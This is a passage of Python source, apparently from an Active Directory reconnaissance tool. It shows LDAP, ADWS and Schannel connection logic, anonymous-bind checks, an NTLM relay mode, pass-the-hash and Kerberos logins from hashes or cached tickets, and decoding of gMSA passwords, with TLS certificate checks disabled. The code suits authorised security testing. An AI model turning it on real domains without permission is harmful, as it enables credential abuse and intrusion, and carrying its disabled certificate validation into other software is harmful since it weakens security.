				use_system_ns=self.use_system_ns,
				resolve_ip=False if self.use_kerberos else True
			)
		elif is_ipaddress(server):
			ldap_address = server 
		else:
			logging.error("Invalid server address. Must be either an FQDN or IP address.")
			return None

		# Set the target domain and ldap address
		self.ldap_address = ldap_address
		self.targetDomain = server.lower()
		
		# Log the appropriate message based on whether we're in proxy mode
		if self.nameserver is None and not self.use_system_ns and is_valid_fqdn(ldap_address):
			logging.debug(f"Using proxy-compatible mode for {server} -> {ldap_address}")
		else:
			logging.debug(f"Updated LDAP address to {ldap_address} for domain {self.targetDomain}")

		return ldap_address

	def get_proto(self):
		return self.proto

	def set_proto(self, proto):
		if proto.lower() == "ldaps":
			self.use_ldaps = True
			self.use_ldap = False
			self.use_gc_ldaps = False
			self.use_gc = False
		elif proto.lower() == "ldap":
			self.use_ldaps = False
			self.use_ldap = True
			self.use_gc_ldaps = False
			self.use_gc = False
		elif proto.lower() == "gc":
			self.use_ldaps = False
			self.use_ldap = False
			self.use_gc_ldaps = False
			self.use_gc = True
		elif proto.lower() == "gc_ldaps":
			self.use_ldaps = False
			self.use_ldap = False
			self.use_gc_ldaps = True
			self.use_gc = False
		elif proto.lower() == "adws":
			self.use_ldaps = False
			self.use_ldap = False
			self.use_gc_ldaps = False
			self.use_gc = False
			self.use_adws = True
		else:
			raise ValueError(f"Invalid protocol: {proto}")

	def get_nameserver(self):
		if self.use_system_ns:
			return get_system_nameserver()
		return self.nameserver

	def set_nameserver(self, nameserver):
		self.nameserver = nameserver

	def who_am_i(self):
		try:
			whoami = self.ldap_session.extend.standard.who_am_i()
			if whoami:
				whoami = whoami.split(":")[-1]
		except Exception as e:
			whoami = "%s\\%s" % (self.get_domain(), self.get_username())
		return whoami if whoami else "ANONYMOUS"

	def reset_connection(self, max_retries=3):
		"""
		Reset and reconnect the LDAP connection using exponential backoff strategy
		
		Args:
			max_retries (int): Maximum number of reconnection attempts
			
		Returns:
			bool: True if reconnection successful, False otherwise
		"""
		retry_count = 0
		success = False
		
		while retry_count < max_retries and not success:
			try:
				if retry_count > 0:
					backoff_time = (2 ** retry_count) + random.uniform(0, 1)
					logging.info(f"LDAP reconnection attempt {retry_count+1}/{max_retries} after {backoff_time:.2f} seconds")
					time.sleep(backoff_time)
				
				self.ldap_session.rebind()
				
				if self.is_connection_alive():
					logging.info("LDAP reconnection successful")
					success = True
				else:
					logging.warning("LDAP connection not functional after rebind attempt")
					retry_count += 1
				
			except ldap3.core.exceptions.LDAPSocketOpenError as e:
				logging.error(f"Socket open error during reconnection: {str(e)}")
				retry_count += 1
			except ldap3.core.exceptions.LDAPSessionTerminatedByServerError as e:
				logging.error(f"Session terminated by server during reconnection: {str(e)}")
				retry_count += 1
			except ldap3.core.exceptions.LDAPSocketSendError as e:
				logging.error(f"Socket send error during reconnection: {str(e)}")
				retry_count += 1
			except ldap3.core.exceptions.LDAPSocketReceiveError as e:
				logging.error(f"Socket receive error during reconnection: {str(e)}")
				retry_count += 1
			except ldap3.core.exceptions.LDAPBindError as e:
				logging.error(f"Bind error during reconnection: {str(e)}")
				retry_count += 1
			except Exception as e:
				logging.error(f"Unexpected error during reconnection: {str(e)}")
				retry_count += 1
		
		if not success:
			logging.error("Maximum LDAP reconnection attempts reached")
			sys.exit(0)
		
		return success

	def close(self):
		"""Close all connections and resources properly"""
		self._connection_pool.shutdown()
		
		if hasattr(self, '_smb_pool'):
			self._smb_pool.shutdown()

		if hasattr(self, 'ldap_session') and self.ldap_session:
			try:
				if self.ldap_session.bound:
					self.ldap_session.unbind()
				self.ldap_session = None
			except:
				pass
		
		if hasattr(self, 'relay_instance') and self.relay_instance:
			try:
				self.relay_instance.shutdown()
				del self.relay_instance
			except Exception as e:
				logging.error(f"Error shutting down relay server: {str(e)}")
		
		if hasattr(self, 'rpc_conn') and self.rpc_conn:
			try:
				self.rpc_conn.disconnect()
			except:
				pass

	def init_ldap_session(self, ldap_address=None, use_ldap=False, use_gc_ldap=False):
		if self.targetDomain and self.targetDomain != self.domain and self.kdcHost:
			self.kdcHost = None

		if use_ldap or use_gc_ldap:
			self.use_ldaps = False
			self.use_gc_ldaps = False

		if self.use_kerberos:
			try:
				if ldap_address and is_ipaddress(ldap_address):
					target = get_machine_name(ldap_address)
					self.kdcHost = target
				elif self.ldap_address is not None and is_ipaddress(self.ldap_address):
					target = get_machine_name(self.ldap_address)
					self.kdcHost = target
				else:
					target = self.ldap_address
			except Exception as e:
				logging.debug("Performing reverse DNS lookup")
				target = ip2host(self.ldap_address, nameserver=self.nameserver, timeout=5)
				if not target:
					logging.warning(f"Failed to get computer hostname. The domain probably does not support NTLM authentication. Skipping...")
					target = self.ldap_address

			if not is_valid_fqdn(target):
				logging.error("Keberos authentication requires FQDN instead of IP")
				sys.exit(0)
		else:
			if ldap_address:
				if is_valid_fqdn(ldap_address):
					target = host2ip(ldap_address, nameserver=self.nameserver, use_system_ns=self.use_system_ns)
				else:
					target = ldap_address
			elif self.ldap_address is not None:
				target = self.ldap_address
			else:
				target = self.domain

		if self.do_certificate:
			logging.debug("Using Schannel, trying to authenticate with provided certificate")

			try:
				key_file = tempfile.NamedTemporaryFile(delete=False)
				key_file.write(key_to_pem(self.key))
				key_file.close()
			except AttributeError as e:
				logging.error("Not a valid key file")
				sys.exit(0)

			try:
				cert_file = tempfile.NamedTemporaryFile(delete=False)
				cert_file.write(cert_to_pem(self.cert))
				cert_file.close()
			except AttributeError as e:
				logging.error(str(e))
				sys.exit(0)
			
			logging.debug(f"Key File: {key_file.name}")
			logging.debug(f"Cert File: {cert_file.name}")
			tls = ldap3.Tls(
					local_private_key_file=key_file.name,
					local_certificate_file=cert_file.name,
					validate=ssl.CERT_NONE,
					ciphers="ALL:@SECLEVEL=0",
                	ssl_options=[ssl.OP_ALL],
				)
			self.ldap_server, self.ldap_session = self.init_ldap_schannel_connection(target, tls)
			if not self.username:
				self.username = self.who_am_i().split("\\")[1]
			if not self.domain:
				self.domain = dn2domain(self.ldap_server.info.other["defaultNamingContext"][0])
			return self.ldap_server, self.ldap_session

		_anonymous = False
		if not self.domain and not self.username and (not self.password or not self.nthash or not self.lmhash):
			if self.relay:
				target = "ldaps://%s" % (self.ldap_address) if self.use_ldaps else "ldap://%s" % (self.ldap_address)
				logging.info(f"[Relay] Targeting {target}")

				try:
					# Store the relay instance as a class attribute
					self.relay_instance = Relay(target, self.relay_host, self.relay_port, self.args)
					self.relay_instance.start()
				except PermissionError as e:
					if "Permission denied" in str(e):
						logging.error(f"[Relay] Permission denied when setting up relay server on port {self.relay_port}.")
						logging.error(f"[Relay] Try running with sudo or using a port above 1024 with --relay-port option.")
						sys.exit(1)
					else:
						# Re-raise any other permission errors
						raise

				self.ldap_session = self.relay_instance.get_ldap_session()
				self.ldap_server = self.relay_instance.get_ldap_server()
				self.proto = self.relay_instance.get_scheme()

				# setting back to default
				self.relay = False

				return self.ldap_server, self.ldap_session
			else:
				logging.debug("No credentials supplied. Using ANONYMOUS access")
				_anonymous = True
		else:
			if self.relay:
				logging.warning("Credentials supplied with relay option. Ignoring relay flag...")

		if self.use_ldaps is True or self.use_gc_ldaps is True:
			try:
				tls = ldap3.Tls(
					validate=ssl.CERT_NONE,
					version=ssl.PROTOCOL_TLSv1_2,
					ciphers='ALL:@SECLEVEL=0',
				)
				if _anonymous:
					self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target, tls)
				else:
					self.ldap_server, self.ldap_session = self.init_ldap_connection(target, tls, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_aes_key=self.auth_aes_key, auth_method=self.auth_method)

				# check if domain is empty
				if not self.domain or not is_valid_fqdn(self.domain):
					self.refresh_domain()
				
				return self.ldap_server, self.ldap_session
			except (ldap3.core.exceptions.LDAPSocketOpenError, ConnectionResetError):
				try:
					tls = ldap3.Tls(
						validate=ssl.CERT_NONE,
						version=ssl.PROTOCOL_TLSv1,
						ciphers='ALL:@SECLEVEL=0',
					)
					if _anonymous:
						self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target, tls)
					else:
						self.ldap_server, self.ldap_session = self.init_ldap_connection(target, tls, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_aes_key=self.auth_aes_key, auth_method=self.auth_method)
					return self.ldap_server, self.ldap_session
				except:
					if self.use_ldaps:
						logging.debug('Error bind to LDAPS, trying LDAP')
						self.set_proto("ldap")
					elif self.use_gc_ldaps:
						logging.debug('Error bind to GC ssl, trying GC')
						self.set_proto("gc")
					return self.init_ldap_session()
		elif self.use_adws:
			self.ldap_server, self.ldap_session = self.init_adws_session()
			return self.ldap_server, self.ldap_session
		else:
			if _anonymous:
				self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target)
			else:
				self.ldap_server, self.ldap_session = self.init_ldap_connection(target, None, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_aes_key=self.auth_aes_key, auth_method=self.auth_method)
			return self.ldap_server, self.ldap_session

	def init_adws_session(self):
		if self.auth_method != ldap3.NTLM:
			logging.error("ADWS protocol only supports NTLM authentication as of now")
			sys.exit(0)

		target = self.ldap_address
		self.ldap_server, self.ldap_session = self.init_adws_connection(target, self.domain, self.username, self.password, self.lmhash, self.nthash)
		return self.ldap_server, self.ldap_session

	def init_ldap_anonymous(self, target, tls=None):
		ldap_server_kwargs = {
			"host": target,
			"get_info": ldap3.ALL,
			"formatter": {
				"sAMAccountType": LDAP.resolve_samaccounttype,
				"lastLogon": LDAP.ldap2datetime,
				"whenCreated": LDAP.resolve_generalized_time,
				"whenChanged": LDAP.resolve_generalized_time,
				"pwdLastSet": LDAP.ldap2datetime,
				"badPasswordTime": LDAP.ldap2datetime,
				"lastLogonTimestamp": LDAP.ldap2datetime,
				"objectGUID": LDAP.bin_to_guid,
				"objectSid": LDAP.bin_to_sid,
				"securityIdentifier": LDAP.bin_to_sid,
				"mS-DS-CreatorSID": LDAP.bin_to_sid,
				"msDS-ManagedPassword": LDAP.formatGMSApass,
				"pwdProperties": LDAP.resolve_pwdProperties,
				"userAccountControl": LDAP.resolve_uac,
				"msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
				"trustAttributes": TRUST.resolve_trustAttributes,
				"trustType": TRUST.resolve_trustType,
				"trustDirection": TRUST.resolve_trustDirection,
				"msExchVersion": EXCHANGE.resolve_msExchVersion,
				"msDS-AllowedToActOnBehalfOfOtherIdentity": LDAP.resolve_msDSAllowedToActOnBehalfOfOtherIdentity,
				"msDS-TrustForestTrustInfo": LDAP.resolve_msDSTrustForestTrustInfo,
				"pKIExpirationPeriod": LDAP.resolve_pKIExpirationPeriod,
				"pKIOverlapPeriod": LDAP.resolve_pKIOverlapPeriod,
				"msDS-DelegatedMSAState": LDAP.resolve_delegated_msa_state
			}
		}

		if tls:
			if self.use_ldaps:
				self.proto = "LDAPS"
				ldap_server_kwargs["use_ssl"] = True
				ldap_server_kwargs["port"] = 636
			elif self.use_gc_ldaps:
				self.proto = "GCssl"
				ldap_server_kwargs["use_ssl"] = True
				ldap_server_kwargs["port"] = 3269
		else:
			if self.use_gc:
				self.proto = "GC"
				ldap_server_kwargs["use_ssl"] = False
				ldap_server_kwargs["port"] = 3268
			elif self.use_ldap:
				self.proto = "LDAP"
				ldap_server_kwargs["use_ssl"] = False
				ldap_server_kwargs["port"] = 389

		logging.debug(f"Connecting as ANONYMOUS to %s, Port: %s, SSL: %s" % (ldap_server_kwargs["host"], ldap_server_kwargs["port"], ldap_server_kwargs["use_ssl"]))
		self.ldap_server = ldap3.Server(**ldap_server_kwargs)
		self.ldap_session = ldap3.Connection(self.ldap_server)

		if not self.ldap_session.bind():
			logging.info(f"Error binding to {self.proto}")
			sys.exit(0)

		base_dn = self.ldap_server.info.other['defaultNamingContext'][0]
		self.domain = dn2domain(self.ldap_server.info.other['defaultNamingContext'][0])
		if not self.ldap_session.search(base_dn,'(objectclass=*)'):
			logging.warning("ANONYMOUS access not allowed for %s" % (self.domain))
			sys.exit(0)
		else:
			logging.info("Server allows ANONYMOUS access!")
			
			# check if domain is empty
			if not self.domain or not is_valid_fqdn(self.domain):
				self.domain = dn2domain(self.ldap_server.info.other.get('rootDomainNamingContext')[0])
				self.username = "ANONYMOUS"
			
			return self.ldap_server, self.ldap_session

	def init_ldap_schannel_connection(self, target, tls, seal_and_sign=False, tls_channel_binding=False):
		ldap_server_kwargs = {
			"host": target,
			"get_info": ldap3.ALL,
			"use_ssl": True if self.use_gc_ldaps or self.use_ldaps else False,
			"tls": tls,
			"port": self.port,
			"formatter": {
				"sAMAccountType": LDAP.resolve_samaccounttype,
				"lastLogon": LDAP.ldap2datetime,
				"whenCreated": LDAP.resolve_generalized_time,
				"whenChanged": LDAP.resolve_generalized_time,
				"pwdLastSet": LDAP.ldap2datetime,
				"badPasswordTime": LDAP.ldap2datetime,
				"lastLogonTimestamp": LDAP.ldap2datetime,
				"objectGUID": LDAP.bin_to_guid,
				"objectSid": LDAP.bin_to_sid,
				"securityIdentifier": LDAP.bin_to_sid,
				"mS-DS-CreatorSID": LDAP.bin_to_sid,
				"msDS-ManagedPassword": LDAP.formatGMSApass,
				"msDS-GroupMSAMembership": LDAP.parseMSAMembership,
				"pwdProperties": LDAP.resolve_pwdProperties,
				"userAccountControl": LDAP.resolve_uac,
				"msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
				"trustAttributes": TRUST.resolve_trustAttributes,
				"trustType": TRUST.resolve_trustType,
				"trustDirection": TRUST.resolve_trustDirection,
				"msExchVersion": EXCHANGE.resolve_msExchVersion,
				"msDS-AllowedToActOnBehalfOfOtherIdentity": LDAP.resolve_msDSAllowedToActOnBehalfOfOtherIdentity,
				"msDS-TrustForestTrustInfo": LDAP.resolve_msDSTrustForestTrustInfo,
				"pKIExpirationPeriod": LDAP.resolve_pKIExpirationPeriod,
				"pKIOverlapPeriod": LDAP.resolve_pKIOverlapPeriod,
				"msDS-DelegatedMSAState": LDAP.resolve_delegated_msa_state
			}
		}

		if self.use_ldaps:
			self.proto = "LDAPS"
			ldap_server_kwargs["use_ssl"] = True
			ldap_server_kwargs["port"] = 636 if not self.port else self.port
		elif self.use_gc_ldaps:
			self.proto = "GCssl"
			ldap_server_kwargs["use_ssl"] = True
			ldap_server_kwargs["port"] = 3269 if not self.port else self.port

		ldap_connection_kwargs = {
			"user": None,
			"authentication": ldap3.SASL,
			"sasl_mechanism": ldap3.EXTERNAL
		}

		ldap_server = ldap3.Server(**ldap_server_kwargs)
		try:
			if seal_and_sign or self.use_sign_and_seal:
				logging.debug("Using seal and sign")
				ldap_connection_kwargs["session_security"] = ldap3.ENCRYPT
			elif tls_channel_binding or self.use_channel_binding:
				logging.debug("Using channel binding")
				ldap_connection_kwargs["channel_binding"] = ldap3.TLS_CHANNEL_BINDING
			
			ldap_session = ldap3.Connection(ldap_server, raise_exceptions=True, **ldap_connection_kwargs)
			ldap_session.open()
		except ldap3.core.exceptions.LDAPInvalidCredentialsResult as e:
			logging.debug("Server returns invalidCredentials")
			if 'AcceptSecurityContext error, data 80090346' in str(ldap_session.result):
				logging.warning("Channel binding is enforced!")
				if self.tls_channel_binding_supported and (self.use_ldaps or self.use_gc_ldaps):
					logging.debug("Re-authenticate with channel binding")
					return self.init_ldap_schannel_connection(target, tls, tls_channel_binding=True)
				else:
					logging.warning('ldap3 library doesn\'t support CB. Install with "pip install \"git+https://github.com/H0j3n/ldap3.git@powerview.py_match-requirements\""')
					sys.exit(-1)
		except ldap3.core.exceptions.LDAPStrongerAuthRequiredResult as e:
			logging.debug("Server returns LDAPStrongerAuthRequiredResult")
			logging.warning("LDAP Signing is enforced!")
			if self.sign_and_seal_supported:
				logging.debug("Re-authenticate with seal and sign")
				return self.init_ldap_schannel_connection(target, tls, seal_and_sign=True)
			else:
				logging.warning('ldap3 library doesn\'t support CB. Install with "pip install \"git+https://github.com/H0j3n/ldap3.git@powerview.py_match-requirements\""')
				sys.exit(-1)
		except ldap3.core.exceptions.LDAPInappropriateAuthenticationResult as e:
			logging.error("Cannot start kerberos signing/sealing when using TLS/SSL")
			sys.exit(-1)
		except ldap3.core.exceptions.LDAPInvalidValueError as e:
			logging.error(str(e))
			sys.exit(-1)
		except Exception as e:
			logging.error("Error during schannel authentication with error: %s", str(e))
			sys.exit(0)
		
		if ldap_session.result is not None:
			logging.error(f"AuthError: {str(ldap_session.result['message'])}")
			sys.exit(0)

		return ldap_server, ldap_session

	def init_adws_connection(self, target, domain=None, username=None, password=None, lmhash=None, nthash=None, seal_and_sign=False, tls_channel_binding=False, auth_method=ldap3.NTLM):
		self.proto = "ADWS"
		
		adws_server_kwargs = {
			"host": target,
			"port": 9389,
			"formatter": {
				"sAMAccountType": LDAP.resolve_samaccounttype,
				"lastLogon": LDAP.ldap2datetime,
				"whenCreated": LDAP.resolve_generalized_time,
				"whenChanged": LDAP.resolve_generalized_time,
				"pwdLastSet": LDAP.ldap2datetime,
				"badPasswordTime": LDAP.ldap2datetime,
				"lastLogonTimestamp": LDAP.ldap2datetime,
				"objectGUID": LDAP.bin_to_guid,
				"objectSid": LDAP.bin_to_sid,
				"securityIdentifier": LDAP.bin_to_sid,
				"mS-DS-CreatorSID": LDAP.bin_to_sid,
				"msDS-ManagedPassword": LDAP.formatGMSApass,
				"msDS-GroupMSAMembership": LDAP.parseMSAMembership,
				"pwdProperties": LDAP.resolve_pwdProperties,
				"userAccountControl": LDAP.resolve_uac,
				"msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
				"trustAttributes": TRUST.resolve_trustAttributes,
				"trustType": TRUST.resolve_trustType,
				"trustDirection": TRUST.resolve_trustDirection,
				"msExchVersion": EXCHANGE.resolve_msExchVersion,
				"msDS-AllowedToActOnBehalfOfOtherIdentity": LDAP.resolve_msDSAllowedToActOnBehalfOfOtherIdentity,
				"msDS-TrustForestTrustInfo": LDAP.resolve_msDSTrustForestTrustInfo,
				"pKIExpirationPeriod": LDAP.resolve_pKIExpirationPeriod,
				"pKIOverlapPeriod": LDAP.resolve_pKIOverlapPeriod,
				"msDS-DelegatedMSAState": LDAP.resolve_delegated_msa_state
			}
		}
		adws_server = adws.Server(**adws_server_kwargs)

		adws_connection_kwargs = {
			"user": username,
			"password": password,
			"domain": domain,
			"lmhash": lmhash,
			"nthash": nthash,
			"raise_exceptions": True
		}
		try:
			adws_connection = adws.Connection(adws_server, **adws_connection_kwargs)
			adws_server, adws_session = adws_connection.connect(get_info=True)
			return adws_server, adws_session
		except Exception as e:
			if self.args.stack_trace:
				raise e
			else:
				logging.error(f"Error during ADWS authentication with error: {str(e)}")
			sys.exit(0)

	def init_ldap_connection(self, target, tls, domain=None, username=None, password=None, lmhash=None, nthash=None, auth_aes_key=None, seal_and_sign=False, tls_channel_binding=False, auth_method=ldap3.NTLM):
		ldap_server_kwargs = {
			"host": target,
			"get_info": ldap3.ALL,
			"allowed_referral_hosts": [('*', True)],
			"mode": ldap3.IP_V4_PREFERRED,
			"formatter": {
				"sAMAccountType": LDAP.resolve_samaccounttype,
				"lastLogon": LDAP.ldap2datetime,
				"whenCreated": LDAP.resolve_generalized_time,
				"whenChanged": LDAP.resolve_generalized_time,
				"pwdLastSet": LDAP.ldap2datetime,
				"badPasswordTime": LDAP.ldap2datetime,
				"lastLogonTimestamp": LDAP.ldap2datetime,
				"objectGUID": LDAP.bin_to_guid,
				"objectSid": LDAP.bin_to_sid,
				"securityIdentifier": LDAP.bin_to_sid,
				"mS-DS-CreatorSID": LDAP.bin_to_sid,
				"msDS-ManagedPassword": LDAP.formatGMSApass,
				"msDS-GroupMSAMembership": LDAP.parseMSAMembership,
				"pwdProperties": LDAP.resolve_pwdProperties,
				"userAccountControl": LDAP.resolve_uac,
				"msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
				"trustAttributes": TRUST.resolve_trustAttributes,
				"trustType": TRUST.resolve_trustType,
				"trustDirection": TRUST.resolve_trustDirection,
				"msExchVersion": EXCHANGE.resolve_msExchVersion,
				"msDS-AllowedToActOnBehalfOfOtherIdentity": LDAP.resolve_msDSAllowedToActOnBehalfOfOtherIdentity,
				"msDS-TrustForestTrustInfo": LDAP.resolve_msDSTrustForestTrustInfo,
				"pKIExpirationPeriod": LDAP.resolve_pKIExpirationPeriod,
				"pKIOverlapPeriod": LDAP.resolve_pKIOverlapPeriod,
				"msDS-DelegatedMSAState": LDAP.resolve_delegated_msa_state
			}
		}

		if tls:
			if self.use_ldaps:
				self.proto = "LDAPS"
				ldap_server_kwargs["use_ssl"] = True
				ldap_server_kwargs["port"] = 636 if not self.port else self.port
			elif self.use_gc_ldaps:
				self.proto = "GCssl"
				ldap_server_kwargs["use_ssl"] = True
				ldap_server_kwargs["port"] = 3269 if not self.port else self.port
		else:
			if self.use_gc:
				self.proto = "GC"
				ldap_server_kwargs["use_ssl"] = False
				ldap_server_kwargs["port"] = 3268 if not self.port else self.port
			elif self.use_ldap:
				self.proto = "LDAP"
				ldap_server_kwargs["use_ssl"] = False
				ldap_server_kwargs["port"] = 389 if not self.port else self.port

		bind = False

		ldap_server = ldap3.Server(**ldap_server_kwargs)

		user = None
		if auth_method == ldap3.NTLM:
			user = '%s\\%s' % (domain, username)
		elif auth_method == ldap3.SIMPLE or auth_method == ldap3.SASL:
			user = '{}@{}'.format(username, domain)
		else:
			user = username

		ldap_connection_kwargs = {
			"user":user,
			"raise_exceptions": True,
			"authentication": auth_method
		}
		logging.debug("Authentication: {}, User: {}".format(auth_method, user))

		if seal_and_sign or self.use_sign_and_seal:
			logging.debug("Using seal and sign")
			ldap_connection_kwargs["session_security"] = ldap3.ENCRYPT
		elif tls_channel_binding or self.use_channel_binding:
			logging.debug("Using channel binding")
			ldap_connection_kwargs["channel_binding"] = ldap3.TLS_CHANNEL_BINDING

		logging.debug(f"Connecting to %s, Port: %s, SSL: %s" % (ldap_server_kwargs["host"], ldap_server_kwargs["port"], ldap_server_kwargs["use_ssl"]))
		if self.use_kerberos:
			ldap_connection_kwargs["sasl_mechanism"] = ldap3.KERBEROS
			ldap_session = ldap3.Connection(ldap_server, **ldap_connection_kwargs)
			try:
				# this is unnecessary, it's already done in the ldap3_kerberos_login function, save it for the doomsday scenario
				# bind = ldap_session.bind()
				self.ldap3_kerberos_login(ldap_session, target, user, password, domain, lmhash, nthash, auth_aes_key, kdcHost=self.kdcHost, useCache=self.no_pass)
				ldap_session.refresh_server_info()
			except Exception as e:
				if "invalid server address" in str(e):
					logging.error("Cannot resolve server address ({}).".format(target))
				else:
					raise e
				sys.exit(0)
		else:
			if self.hashes is not None:
				ldap_connection_kwargs["password"] = '{}:{}'.format(lmhash, nthash)
			elif password is not None:
				ldap_connection_kwargs["password"] = password
			
			try:
				ldap_session = ldap3.Connection(ldap_server, **ldap_connection_kwargs)
				bind = ldap_session.bind()
			except ldap3.core.exceptions.LDAPInvalidCredentialsResult as e:
				logging.debug("Server returns invalidCredentials")
				if 'AcceptSecurityContext error, data 80090346' in str(ldap_session.result):
					logging.warning("Channel binding is enforced!")
					if self.tls_channel_binding_supported and (self.use_ldaps or self.use_gc_ldaps):
						logging.debug("Re-authenticate with channel binding")
						return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, auth_aes_key, tls_channel_binding=True, auth_method=self.auth_method)
					else:
						if lmhash and nthash:
							sys.exit(-1)
						else:
							logging.info("Falling back to SIMPLE authentication")
							return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, auth_aes_key, auth_method=ldap3.SIMPLE)
			except ldap3.core.exceptions.LDAPStrongerAuthRequiredResult as e:
				logging.debug("Server returns LDAPStrongerAuthRequiredResult")
				logging.warning("LDAP Signing is enforced!")
				if self.sign_and_seal_supported:
					logging.debug("Re-authenticate with seal and sign")
					return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, auth_aes_key, seal_and_sign=True, auth_method=self.auth_method)
				else:
					sys.exit(-1)
			except ldap3.core.exceptions.LDAPInappropriateAuthenticationResult as e:
				logging.error("Cannot start kerberos signing/sealing when using TLS/SSL")
				sys.exit(-1)
			except ldap3.core.exceptions.LDAPInvalidValueError as e:
				logging.error(str(e))
				sys.exit(-1)
			except ldap3.core.exceptions.LDAPOperationsErrorResult as e:
				logging.error("Failed to bind with error: %s" % (str(e)))
				sys.exit(-1)

			if not bind:
				error_code = ldap_session.result['message'].split(",")[2].replace("data","").strip()
				error_status = LDAP.resolve_err_status(error_code)
				if error_code and error_status:
					logging.error("Bind not successful - %s [%s]" % (ldap_session.result['description'], error_status))
					logging.debug("%s" % (ldap_session.result['message']))
				else:
					logging.error(f"Unexpected Error: {str(ldap_session.result['message'])}")

				sys.exit(0)
			else:
				logging.debug("Bind SUCCESS!")

		return ldap_server, ldap_session

	def ldap3_kerberos_login(self, connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
		from pyasn1.codec.ber import encoder, decoder
		from pyasn1.type.univ import noValue
		from binascii import hexlify, unhexlify
		"""
		logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
		:param string user: username
		:param string password: password for the user
		:param string domain: domain where the account is valid for (required)
		:param string lmhash: LMHASH used to authenticate using hashes (password is not used)
		:param string nthash: NTHASH used to authenticate using hashes (password is not used)
		:param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
		:param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
		:param struct TGT: If there's a TGT available, send the structure here and it will be used
		:param struct TGS: same for TGS. See smb3.py for the format
		:param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
		:return: True, raises an Exception if error.
		"""

		if lmhash != '' or nthash != '':
			if len(lmhash) % 2:
				lmhash = '0' + lmhash
			if len(nthash) % 2:
				nthash = '0' + nthash
			try:  # just in case they were converted already
				lmhash = unhexlify(lmhash)
				nthash = unhexlify(nthash)
			except TypeError:
				pass

		# Importing down here so pyasn1 is not required if kerberos is not used.
		from impacket.krb5.ccache import CCache
		from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
		from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
		from impacket.krb5 import constants
		from impacket.krb5.types import Principal, KerberosTime, Ticket
		import datetime
		import os

		if self.TGT or self.TGS:
			useCache = False

		if useCache:
			try:
				env_krb5ccname = os.getenv('KRB5CCNAME')
				if not env_krb5ccname:
					logging.error("No KRB5CCNAME environment present.")
					sys.exit(0)
				ccache = CCache.loadFile(env_krb5ccname)
			except Exception as e:
				# No cache present
				logging.warning("No Kerberos cache found")
				pass
			else:
				# retrieve domain information from CCache file if needed
				if domain == '':
					domain = ccache.principal.realm['data'].decode('utf-8')
					logging.debug('Domain retrieved from CCache: %s' % domain)

				logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
				principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

				creds = ccache.getCredential(principal)
				if creds is None:
					# Let's try for the TGT and go from there
					principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
					creds = ccache.getCredential(principal)
					if creds is not None:
						self.TGT = creds.toTGT()
						logging.debug('Using TGT from cache')
					else:
						logging.debug('No valid credentials found in cache')
				else:
					self.TGS = creds.toTGS(principal)
					logging.debug('Using TGS from cache')

				# retrieve user information from CCache file if needed
				if user == '' and creds is not None:
					user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
					logging.debug('Username retrieved from CCache: %s' % user)
				elif user == '' and len(ccache.principal.components) > 0:
					user = ccache.principal.components[0]['data'].decode('utf-8')
					logging.debug('Username retrieved from CCache: %s' % user)

		# First of all, we need to get a TGT for the user
		userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
		if not self.TGT:
			self.TGT = dict()
			if not self.TGS:
				tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
				self.TGT['KDC_REP'] = tgt
				self.TGT['cipher'] = cipher
				self.TGT['oldSessionKey'] = oldSessionKey
				self.TGT['sessionKey'] = sessionKey
		else:
			tgt = self.TGT['KDC_REP']
			cipher = self.TGT['cipher']
			sessionKey = self.TGT['sessionKey']

		if not self.TGS:
			self.TGS = dict()
			serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
			tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
			self.TGS['KDC_REP'] = tgs
			self.TGS['cipher'] = cipher
			self.TGS['oldSessionKey'] = oldSessionKey
			self.TGS['sessionKey'] = sessionKey
		else:
			tgs = self.TGS['KDC_REP']
			cipher = self.TGS['cipher']
			sessionKey = self.TGS['sessionKey']

			# Let's build a NegTokenInit with a Kerberos REQ_AP

		blob = SPNEGO_NegTokenInit()

		# Kerberos
		blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

		# Let's extract the ticket from the TGS
		tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
		ticket = Ticket()
		ticket.from_asn1(tgs['ticket'])

		# Now let's build the AP_REQ
		apReq = AP_REQ()
		apReq['pvno'] = 5
		apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

		opts = []
		apReq['ap-options'] = constants.encodeFlags(opts)
		seq_set(apReq, 'ticket', ticket.to_asn1)

		authenticator = Authenticator()
		authenticator['authenticator-vno'] = 5
		authenticator['crealm'] = domain
		seq_set(authenticator, 'cname', userName.components_to_asn1)
		now = datetime.datetime.utcnow()

		authenticator['cusec'] = now.microsecond
		authenticator['ctime'] = KerberosTime.to_asn1(now)

		encodedAuthenticator = encoder.encode(authenticator)

		# Key Usage 11
		# AP-REQ Authenticator (includes application authenticator
